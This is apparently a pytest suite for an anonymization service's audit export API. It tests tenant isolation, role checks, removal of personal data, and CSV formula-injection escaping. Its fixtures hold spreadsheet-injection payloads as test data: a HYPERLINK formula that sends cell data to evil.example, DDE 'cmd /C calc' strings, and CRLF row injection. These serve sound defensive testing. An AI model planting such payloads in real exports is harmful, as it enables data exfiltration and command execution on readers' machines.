"""Tenant scope, CSV formula escaping, and safe anonymization export fields.

Mirrors the QA probe in uploads/export_probe.py: synthetic identifiers only.
"""

from __future__ import annotations

import csv
import io
import json
from datetime import UTC, datetime
from types import SimpleNamespace

import pytest
from fastapi import FastAPI
from httpx import ASGITransport, AsyncClient
from hypothesis import given
from hypothesis import strategies as st
from sqlalchemy.ext.asyncio import create_async_engine

from anonreq.api.v1.admin.audit import router as admin_audit_router
from anonreq.models.audit import Base
from anonreq.routes.governance import router as governance_router
from anonreq.services.audit_chain import AuditChainService, AuditConfig
from anonreq.services.audit_export import (
    escape_csv_formula,
    render_anonymization_csv,
    safe_anonymization_row,
)

FAKE_IBAN = "DE22710190115300059797"
FAKE_EMAIL = "jürgen.groß@beispiel-mail.example"
_FORMULA_LEAD = "=+-@\t\r\n|\uff1d\uff0b\uff0d\uff20"
_BASE = {
    "entity_types": ["IBAN_DE", "EMAIL_ADDRESS"],
    "entity_counts": {"IBAN_DE": 1, "EMAIL_ADDRESS": 1},
    "token_count": 2,
    "locale": "de-DE",
    "compliance_preset": "germany",
}


def _event(**overrides: object) -> SimpleNamespace:
    payload = {
        "timestamp": datetime(2026, 8, 14, 9, 0, tzinfo=UTC),
        "request_id": "req-1",
        "tenant_id": "tenant_a",
        "operator_id": "dpo1",
        "provider": "openai",
        "decision": "ANONYMIZE",
        "metadata_json": json.dumps(
            {
                "entity_types": ["TAX_ID_DE", "IBAN_DE"],
                "entity_counts": {"TAX_ID_DE": 1, "IBAN_DE": 1},
                "token_count": 2,
                "locale": "de-DE",
                "model": "gpt-4o",
                "compliance_preset": "germany",
            }
        ),
    }
    payload.update(overrides)
    return SimpleNamespace(**payload)


def _app(service: AuditChainService, mode: str = "header") -> FastAPI:
    app = FastAPI()
    app.state.audit_chain = service

    @app.middleware("http")
    async def inject_principal(request, call_next):
        if mode == "header":
            if request.headers.get("Authorization"):
                request.state.role_principal = {
                    "principal_id": "qa",
                    "role": request.headers.get("X-AnonReq-Role", "administrator"),
                    "tenant_id": request.headers.get("X-AnonReq-Tenant-ID", "tenant_a"),
                }
            else:
                request.state.role_principal = None
        elif mode == "principal_over_state":
            request.state.role_principal = {
                "principal_id": "qa",
                "role": "administrator",
                "tenant_id": "tenant_a",
            }
            request.state.tenant_id = "tenant_b"
        elif mode == "wildcard_state":
            request.state.role_principal = {
                "principal_id": "admin",
                "role": "administrator",
                "tenant_id": "*",
            }
            request.state.tenant_id = "tenant_a"
        elif mode == "wildcard_only":
            request.state.role_principal = {
                "principal_id": "admin",
                "role": "administrator",
                "tenant_id": "*",
            }
        return await call_next(request)

    app.include_router(admin_audit_router)
    app.include_router(governance_router)
    return app


@pytest.fixture
async def audit_service() -> AuditChainService:
    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    service = AuditChainService(engine, AuditConfig(retention_days=30))
    base = dict(_BASE)
    await service.log_event(
        "anonymization",
        tenant_id="tenant_a",
        request_id="req-a1",
        operator_id="Jörg Müßig",
        provider="openai",
        decision="ANONYMIZE",
        model="gpt-4o",
        raw_value=FAKE_IBAN,
        **base,
    )
    await service.log_event(
        "anonymization",
        tenant_id="tenant_a",
        request_id='=HYPERLINK("http://evil.example/?x="&A1,"klick")',
        operator_id="+cmd|' /C calc'!A0",
        provider="openai",
        decision="ANONYMIZE",
        model="@SUM(1+1)*cmd|' /C calc'!A0",
        **{**base, "locale": "-2+3"},
    )
    await service.log_event(
        "anonymization",
        tenant_id="tenant_a",
        request_id="req-a3",
        provider="openai",
        decision="ANONYMIZE",
        model=f"gpt-4o {FAKE_EMAIL}",
        **{**base, "entity_types": f"IBAN_DE:{FAKE_IBAN}"},
    )
    await service.log_event(
        "anonymization",
        tenant_id="tenant_a",
        request_id="req-a4\r\nINJ,ROW",
        provider="x",
        decision="ANONYMIZE",
        model="tab\tpipe|",
        **base,
    )
    await service.log_event(
        "anonymization",
        tenant_id="tenant_b",
        request_id="req-b1",
        operator_id="Özlem Şahin",
        provider="openai",
        decision="ANONYMIZE",
        model="gpt-4o",
        **base,
    )
    await service.log_event(
        "config_change",
        tenant_id="tenant_a",
        request_id="cfg-a",
        operator_id="op1",
        change_type="update",
    )
    await service.log_event(
        "config_change",
        tenant_id="tenant_b",
        request_id="cfg-b",
        operator_id="op2",
        change_type="update",
    )
    await service.log_event(
        "slo_breach_detected",
        tenant_id="tenant_a",
        request_id="breach-a",
    )
    await service.log_event(
        "slo_breach_detected",
        tenant_id="tenant_b",
        request_id="breach-b",
    )
    yield service
    await engine.dispose()


def _headers(tenant: str = "tenant_a") -> dict[str, str]:
    return {
        "Authorization": "Bearer x",
        "X-AnonReq-Tenant-ID": tenant,
        "X-AnonReq-Role": "administrator",
    }


def _csv_rows(text: str) -> list[dict[str, str]]:
    return list(csv.DictReader(io.StringIO(text)))


async def test_qa_probe_csv_and_json(audit_service: AuditChainService) -> None:
    """QA probe: omitted tenant stays on the caller; foreign tenant is 403."""
    app = _app(audit_service)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
        response = await client.get(
            "/v1/admin/audit/anonymization-export?format=csv",
            headers=_headers(),
        )
        assert response.status_code == 200
        assert "text/csv" in response.headers["content-type"]
        assert "charset=utf-8" in response.headers["content-type"]
        assert not response.content.startswith(b"\xef\xbb\xbf")
        assert FAKE_IBAN not in response.text
        assert FAKE_EMAIL not in response.text
        assert "Özlem Şahin" not in response.text
        assert "Jörg Müßig" in response.text
        assert "+cmd" not in response.text
        assert "@SUM" not in response.text
        rows = _csv_rows(response.text)
        assert sorted({row["tenant_id"] for row in rows}) == ["tenant_a"]
        assert len(rows) == 4
        cells = [value for row in rows for value in row.values() if value]
        assert [value for value in cells if value[:1] in _FORMULA_LEAD] == []
        request_ids = [row["request_id"] for row in rows]
        assert "req-a4INJ,ROW" in request_ids
        assert any(value.startswith("'=") for value in request_ids)
        assert any(row["locale"] == "'-2+3" for row in rows)
        assert "\nINJ" not in response.text
        assert "\rINJ" not in response.text

        foreign = await client.get(
            "/v1/admin/audit/anonymization-export?format=csv&tenant_id=tenant_b",
            headers=_headers(),
        )
        assert foreign.status_code == 403
        wildcard = await client.get(
            "/v1/admin/audit/anonymization-export?format=json&tenant_id=*",
            headers=_headers(),
        )
        assert wildcard.status_code == 403
        assert FAKE_IBAN not in wildcard.text
        assert FAKE_IBAN not in foreign.text
        assert "req-b1" not in foreign.text
        # The probe parses the error body as CSV; that must not raise.
        assert [row["tenant_id"] for row in csv.DictReader(io.StringIO(foreign.text))] == []

        own = await client.get(
            "/v1/admin/audit/anonymization-export?format=csv&tenant_id=tenant_a",
            headers=_headers(),
        )
        assert own.status_code == 200
        own_ids = [row["request_id"] for row in _csv_rows(own.text)]
        assert "req-b1" not in own_ids
        assert "req-a4INJ,ROW" in own_ids

        payload = await client.get(
            "/v1/admin/audit/anonymization-export?format=json",
            headers=_headers(),
        )
        assert payload.status_code == 200
        assert FAKE_IBAN not in payload.text
        assert FAKE_EMAIL not in payload.text
        assert "Jörg Müßig" in payload.text
        assert "Özlem Şahin" not in payload.text
        body = payload.json()
        assert sorted({row["tenant_id"] for row in body}) == ["tenant_a"]
        assert all("\r" not in (row["request_id"] or "") for row in body)
        assert all("\n" not in (row["request_id"] or "") for row in body)
        assert "req-a4INJ,ROW" in {row["request_id"] for row in body}


async def test_csv_bom_query_param(audit_service: AuditChainService) -> None:
    app = _app(audit_service)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
        response = await client.get(
            "/v1/admin/audit/anonymization-export?format=csv&bom=true",
            headers=_headers(),
        )
    assert response.status_code == 200
    assert response.content.startswith(b"\xef\xbb\xbf")
    text = response.content.decode("utf-8-sig")
    rows = _csv_rows(text)
    assert rows
    assert all(row["tenant_id"] == "tenant_a" for row in rows)
    assert FAKE_IBAN not in text


async def test_config_history_and_export_are_tenant_scoped(
    audit_service: AuditChainService,
) -> None:
    app = _app(audit_service)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
        history = await client.get("/v1/admin/audit/config-history", headers=_headers())
        assert history.status_code == 200
        tenants = {item["tenant_id"] for item in history.json()["items"]}
        assert tenants == {"tenant_a"}
        assert "cfg-b" not in history.text

        exported = await client.get(
            "/v1/admin/audit/config-history/export",
            headers=_headers(),
        )
        assert exported.status_code == 200
        lines = [json.loads(line) for line in exported.text.splitlines() if line]
        assert lines
        assert {line["tenant_id"] for line in lines} == {"tenant_a"}
        assert "cfg-b" not in exported.text

        mismatch = await client.get(
            "/v1/admin/audit/config-history?tenant_id=tenant_b",
            headers=_headers(),
        )
        assert mismatch.status_code == 403
        export_mismatch = await client.get(
            "/v1/admin/audit/config-history/export?tenant_id=tenant_b",
            headers=_headers(),
        )
        assert export_mismatch.status_code == 403
        assert "cfg-b" not in export_mismatch.text


async def test_governance_audit_routes_require_security_officer(
    audit_service: AuditChainService,
) -> None:
    app = _app(audit_service)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
        missing = await client.get("/v1/governance/audit/events")
        assert missing.status_code == 401
        missing_verify = await client.get("/v1/governance/audit/verify")
        assert missing_verify.status_code == 401

        operator = {
            "Authorization": "Bearer x",
            "X-AnonReq-Role": "operator",
            "X-AnonReq-Tenant-ID": "tenant_a",
        }
        assert (
            await client.get("/v1/governance/audit/events", headers=operator)
        ).status_code == 403
        assert (
            await client.get("/v1/governance/audit/verify", headers=operator)
        ).status_code == 403

        officer = {
            "Authorization": "Bearer x",
            "X-AnonReq-Role": "security_officer",
            "X-AnonReq-Tenant-ID": "tenant_a",
        }
        allowed = await client.get("/v1/governance/audit/events", headers=officer)
        assert allowed.status_code == 200
        assert {row["tenant_id"] for row in allowed.json()["data"]} == {"tenant_a"}


async def test_governance_audit_reads_follow_caller_tenant(
    audit_service: AuditChainService,
) -> None:
    app = _app(audit_service)
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
        events = await client.get("/v1/governance/audit/events", headers=_headers())
        assert events.status_code == 200
        assert {row["tenant_id"] for row in events.json()["data"]} == {"tenant_a"}

        foreign_events = await client.get(
            "/v1/governance/audit/events?tenant_id=tenant_b",
            headers=_headers(),
        )
        assert foreign_events.status_code == 403

        verified = await client.get("/v1/governance/audit/verify", headers=_headers())
        assert verified.status_code == 200
        assert verified.json()["checked_count"] >= 1
        foreign_verify = await client.get(
            "/v1/governance/audit/verify?tenant_id=tenant_b",
            headers=_headers(),
        )
        assert foreign_verify.status_code == 403

        breaches = await client.get("/v1/governance/breaches", headers=_headers())
        assert breaches.status_code == 200
        assert {row["tenant_id"] for row in breaches.json()["data"]} == {"tenant_a"}
        foreign_breaches = await client.get(
            "/v1/governance/breaches?tenant_id=tenant_b",
            headers=_headers(),
        )
        assert foreign_breaches.status_code == 403
        assert "breach-b" not in foreign_breaches.text


async def test_principal_tenant_beats_header_state(
    audit_service: AuditChainService,
) -> None:
    app = _app(audit_service, mode="principal_over_state")
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
        response = await client.get(
            "/v1/admin/audit/anonymization-export?format=json",
            headers={"Authorization": "Bearer x"},
        )
        assert response.status_code == 200
        assert {row["tenant_id"] for row in response.json()} == {"tenant_a"}
        rejected = await client.get(
            "/v1/admin/audit/anonymization-export?format=json&tenant_id=tenant_b",
            headers={"Authorization": "Bearer x"},
        )
        assert rejected.status_code == 403


async def test_unbound_api_key_uses_validated_tenant_context(
    audit_service: AuditChainService,
) -> None:
    """A wildcard principal is not tenant-bound; the registry tenant is used."""
    app = _app(audit_service, mode="wildcard_state")
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
        response = await client.get(
            "/v1/admin/audit/anonymization-export?format=json",
            headers={"Authorization": "Bearer x"},
        )
        assert response.status_code == 200
        assert {row["tenant_id"] for row in response.json()} == {"tenant_a"}
        rejected = await client.get(
            "/v1/admin/audit/anonymization-export?format=json&tenant_id=tenant_b",
            headers={"Authorization": "Bearer x"},
        )
        assert rejected.status_code == 403


async def test_missing_caller_tenant_is_forbidden(
    audit_service: AuditChainService,
) -> None:
    app = _app(audit_service, mode="wildcard_only")
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as client:
        response = await client.get(
            "/v1/admin/audit/anonymization-export?format=json",
            headers={"Authorization": "Bearer x"},
        )
        assert response.status_code == 403
        assert FAKE_IBAN not in response.text
        assert "req-b1" not in response.text
        events = await client.get("/v1/governance/audit/events")
        assert events.status_code == 403


def test_safe_row_drops_free_text_and_pii() -> None:
    raw_iban = "DE89370400440532013000"
    event = _event(
        operator_id="Jörg Müßig",
        provider="openai",
        metadata_json=json.dumps(
            {
                "entity_types": f"IBAN_DE:{raw_iban}",
                "entity_counts": {"IBAN_DE": 1, "EMAIL_ADDRESS": 1},
                "token_count": FAKE_EMAIL,
                "locale": "-2+3",
                "model": f"gpt-4o {FAKE_EMAIL}",
                "compliance_preset": "germany",
                "raw_iban": raw_iban,
            }
        ),
    )
    row = safe_anonymization_row(event)
    dumped = json.dumps(row)
    assert raw_iban not in dumped
    assert FAKE_EMAIL not in dumped
    assert row["operator_id"] == "Jörg Müßig"
    assert row["model"] == "openai"
    assert row["entity_types"] == "IBAN_DE,EMAIL_ADDRESS"
    assert row["token_count"] is None
    assert row["locale"] == "-2+3"
    assert "raw_iban" not in row


def test_safe_row_keeps_identifier_fields_and_strips_request_id_breaks() -> None:
    event = _event(
        request_id="req-a4\r\nINJ,ROW",
        operator_id="dpo1",
        metadata_json=json.dumps(
            {
                "entity_types": ["TAX_ID_DE", "not an entity", "IBAN_DE"],
                "token_count": 2,
                "locale": "de-DE",
                "model": "llama3.3:70b",
                "compliance_preset": "germany",
            }
        ),
    )
    row = safe_anonymization_row(event)
    assert row["request_id"] == "req-a4INJ,ROW"
    assert row["operator_id"] == "dpo1"
    assert row["model"] == "llama3.3:70b"
    assert row["entity_types"] == "TAX_ID_DE,IBAN_DE"
    assert row["token_count"] == 2


def test_operator_id_keeps_unicode_names_and_rejects_secrets() -> None:
    kept = (
        "Jörg Müßig",
        "Özlem Şahin",
        "Anne-Marie O'Brien",
        "O\u2019Brien",
        "dpo1",
        "op_1",
    )
    for name in kept:
        assert safe_anonymization_row(_event(operator_id=name))["operator_id"] == name

    padded = safe_anonymization_row(_event(operator_id="  Anne-Marie  "))
    assert padded["operator_id"] == "Anne-Marie"
    decomposed = safe_anonymization_row(_event(operator_id="Jo\u0308rg Mu\u0308ßig"))
    assert decomposed["operator_id"] == "Jörg Müßig"

    rejected = (
        "+cmd|' /C calc'!A0",
        "=HYPERLINK()",
        "@SUM(1+1)",
        "-2+3",
        "\tcmd",
        "jörg@example.com",
        FAKE_EMAIL,
        FAKE_IBAN,
        "DE89 3704 0044 0532 0130 00",
        "x" * 65,
        "not/a name",
    )
    for value in rejected:
        assert safe_anonymization_row(_event(operator_id=value))["operator_id"] is None


def test_safe_row_rejects_account_shaped_model_and_operator() -> None:
    event = _event(
        operator_id=FAKE_IBAN,
        provider=FAKE_IBAN,
        metadata_json=json.dumps({"model": FAKE_IBAN, "entity_types": [FAKE_IBAN]}),
    )
    row = safe_anonymization_row(event)
    assert row["operator_id"] is None
    assert row["model"] is None
    assert row["entity_types"] == ""
    assert FAKE_IBAN not in json.dumps(row)


def test_csv_preserves_unicode_when_the_field_is_allowed() -> None:
    payload = render_anonymization_csv(
        [{"locale": "München", "tenant_id": "tenant_a"}],
        bom=True,
    )
    assert payload.startswith(b"\xef\xbb\xbf")
    assert "München" in payload.decode("utf-8-sig")


def test_csv_escapes_pipe_and_fullwidth_formula_leads() -> None:
    leads = ("|", "\n", "\uff1d", "\uff0b", "\uff0d", "\uff20")
    for lead in leads:
        escaped = escape_csv_formula(lead + "cmd")
        assert escaped == "'" + lead + "cmd"
        padded = escape_csv_formula(" " + lead + "cmd")
        assert padded == "' " + lead + "cmd"


def test_csv_formula_prefix_and_bom() -> None:
    row = {
        "timestamp": "2026-08-14T09:00:00+00:00",
        "request_id": "=HYPERLINK()",
        "tenant_id": "tenant_a",
        "operator_id": "+cmd",
        "model": "@SUM(1+1)",
        "locale": "-2+3",
        "entity_types": "IBAN_DE",
        "token_count": 2,
        "decision": " ANONYMIZE",
        "compliance_preset": "\t=cmd",
    }
    payload = render_anonymization_csv([row], bom=True)
    assert payload.startswith(b"\xef\xbb\xbf")
    parsed = _csv_rows(payload.decode("utf-8-sig"))
    assert len(parsed) == 1
    cells = [value for value in parsed[0].values() if value]
    assert [value for value in cells if value[:1] in _FORMULA_LEAD] == []
    assert parsed[0]["request_id"].startswith("'=")
    assert parsed[0]["locale"].startswith("'-")
    assert parsed[0]["compliance_preset"].startswith("'\t")
    plain = render_anonymization_csv([{"tenant_id": "tenant_a"}], bom=False)
    assert not plain.startswith(b"\xef\xbb\xbf")


@given(st.text(min_size=0, max_size=24))
def test_formula_prefix_covers_every_trigger(payload: str) -> None:
    for lead in _FORMULA_LEAD:
        escaped = escape_csv_formula(lead + payload)
        assert escaped.startswith("'")
        assert escaped[0] not in _FORMULA_LEAD
        padded = escape_csv_formula(" " + lead + payload)
        assert padded.startswith("'")
        assert padded[0] not in _FORMULA_LEAD


@given(st.text(alphabet="ABCDEFGHIJKLMNOPQRSTUVWXYZ", min_size=1, max_size=12))
def test_plain_csv_cells_are_unchanged(payload: str) -> None:
    assert escape_csv_formula(payload) == payload
